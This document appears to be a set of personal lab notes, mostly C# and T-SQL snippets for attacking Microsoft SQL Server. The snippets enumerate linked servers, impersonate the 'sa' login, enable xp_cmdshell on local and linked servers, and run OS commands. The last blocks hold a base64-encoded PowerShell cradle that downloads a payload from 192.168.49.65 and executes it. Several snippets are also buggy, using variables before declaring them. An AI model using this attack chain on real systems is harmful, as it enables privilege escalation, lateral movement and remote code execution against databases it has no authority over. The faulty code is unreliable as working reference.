

################################################################



### above is all about getting information about Linked SQL Servers

###################################################################


String sqlServer = "sql05.tricky.com";
String database = "master";
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);


try
{
    con.Open();
    Console.WriteLine("Auth success!");
}
catch
{
    Console.WriteLine("Auth failed");
    Environment.Exit(0);
}

String execCmd = "EXEC sp_linkedservers;";

String execCmd = "select myuser from openquery(\"sql07\", 'select SYSTEM_USER as myuser');";
String localCmd = "select SYSTEM_USER;";
SqlCommand command = new SqlCommand(localCmd, con);
SqlDataReader reader = command.ExecuteReader();

reader.Read();
Console.WriteLine("Executing as the login on sql05: " + reader[0]);
reader.Close();

command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();

reader.Read();
Console.WriteLine("Executing as the login on sql07: " + reader[0]);
reader.Close();

con.Close();




############################


#r "c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll"
using System;
using System.Data.SqlClient;
String sqlServer = "web06";
String database = "master";
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);
try
{
    con.Open();
    Console.WriteLine("Auth success!");
}
catch
{
    Console.WriteLine("Auth failed");
    Environment.Exit(0);
}
String querylogin = "SELECT SYSTEM_USER;";
SqlCommand command = new SqlCommand(querylogin, con);
SqlDataReader reader = command.ExecuteReader();
Console.WriteLine("Before Impersonation...");
reader.Read();
Console.WriteLine("Executing in context as: " + reader[0]);
reader.Close();

String executeas = "EXECUTE AS LOGIN = 'sa'";

command = new SqlCommand(executeas, con);
reader = command.ExecuteReader();
reader.Close();

Console.WriteLine("After Impersonation...");

command = new SqlCommand(querylogin, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Executing in context as: " + reader[0]);
reader.Close();
String execCmd = "EXEC sp_linkedservers;";
command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();
while (reader.Read())
{
    Console.WriteLine("Linked SQL server: " + reader[0]);
}
reader.Close();

con.Close();


#######################################

#r "c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll"
using System;
using System.Data.SqlClient;

String sqlServer = "web06";
String database = "master";
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);
try
{
    con.Open();
    Console.WriteLine("Auth success!");
}
catch
{
    Console.WriteLine("Auth failed");
    Environment.Exit(0);
}
String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
String execCmd = "EXEC xp_cmdshell whoami";

SqlCommand command = new SqlCommand(enable_xpcmd, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();
command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Result of command is: " + reader[0]);
reader.Close();
con.Close();






################################

using System;
using System.Data.SqlClient;
String sqlServer = "sql03";
String database = "master";
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);
try
{
    con.Open();
    Console.WriteLine("Auth success!");
}
catch
{
    Console.WriteLine("Auth failed");
    Environment.Exit(0);
}

String enable_xpcmd = "EXECUTE AS LOGIN = 'sa';";
String execCmd = "EXEC sp_linkedservers;";

command = new SqlCommand(enable_xpcmd, con);
reader = command.ExecuteReader();
reader.Close();
SqlCommand command = new SqlCommand(execCmd, con);
SqlDataReader reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Result of command is: " + reader[0]);
reader.Close();
con.Close();

########################

String sqlServer = "web06";
String database = "master";
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);

try
{
    con.Open();
    Console.WriteLine("Auth success!");
}
catch
{
    Console.WriteLine("Auth failed");
    Environment.Exit(0);
}

//String execCmd = "EXEC sp_linkedservers;";

String execCmd = "select version from openquery(\"sql03\", 'select @@version as version');";
SqlCommand command = new SqlCommand(execCmd, con);
SqlDataReader reader = command.ExecuteReader();
while (reader.Read())
{
    Console.WriteLine("Linked SQL server: " + reader[0]);
}
reader.Close();

con.Close();

#######################

String sqlServer = "web06";
String database = "master";
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);


try
{
    con.Open();
    Console.WriteLine("Auth success!");
}
catch
{
    Console.WriteLine("Auth failed");
    Environment.Exit(0);
}

//String execCmd = "EXEC sp_linkedservers;";
String enable_xpcmd = "EXECUTE AS LOGIN = 'sa';";

command = new SqlCommand(enable_xpcmd, con);
reader = command.ExecuteReader();
reader.Close();
String execCmd = "select myuser from openquery(\"sql03\", 'select SYSTEM_USER as myuser');";
String localCmd = "select SYSTEM_USER;";
SqlCommand command = new SqlCommand(localCmd, con);
SqlDataReader reader = command.ExecuteReader();

reader.Read();
Console.WriteLine("Executing as the login on APPSRV01: " + reader[0]);
reader.Close();

command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();

reader.Read();
Console.WriteLine("Executing as the login on sql03: " + reader[0]);
reader.Close();

con.Close();

##########################

String sqlServer = "web06";
String database = "master";
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);
con.Open();

String enable_xpcmd = "EXECUTE AS LOGIN = 'sa';";
String enable_rpc_out = "EXEC sp_serveroption 'SQL03', 'rpc out', 'true';";
String enableadvopptions = "EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL03;";
String enablexpcmdshell = "EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL03;";
String execCmd = "EXEC('xp_cmdshell ''cmd /c ping 192.168.49.65'';') AT SQL03;";

SqlCommand command = new SqlCommand(enable_xpcmd, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(enable_rpc_out, con);
reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(enableadvopptions, con);
reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(enablexpcmdshell, con);
reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();
reader.Close();
con.Close();
#########################

String sqlServer = "web06";
String database = "master";
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);

con.Open();
Console.WriteLine("Auth success!");

String enable_xpcmd = "EXECUTE AS LOGIN = 'sa';";
SqlCommand command = new SqlCommand(enable_xpcmd, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

String enableadvopptions = "SELECT 1 FROM openquery(\"sql03\",'SELECT 1; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;')";
command = new SqlCommand(enableadvopptions, con);
reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(enablexpcmdshell, con);
reader = command.ExecuteReader();
reader.Close();
String enablexpcmdshell = "SELECT 1 FROM openquery(\"sql03\",'SELECT 1;EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')";

String execCmd = "SELECT 1 FROM openquery(\"sql03\",'SELECT 1;EXEC xp_cmdshell ''cmd /c ping 192.168.49.65'';')";
//String execCmd = "SELECT 1 FROM openquery(\"sql03\",'SELECT 1;EXEC xp_cmdshell ''powershell.exe -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADYANQAvAG0AZQB0AF8ANgA0AGEAbQBzAGkALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA'';')";
command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();
reader.Close();
con.Close();
#########################

EXECUTE AS LOGIN = 'sa';

EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL03;
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL03;
EXEC ('xp_cmdshell ''powershell.exe -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADYANQAvAG0AZQB0AF8ANgA0AGEAbQBzAGkALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA'';') AT SQL03;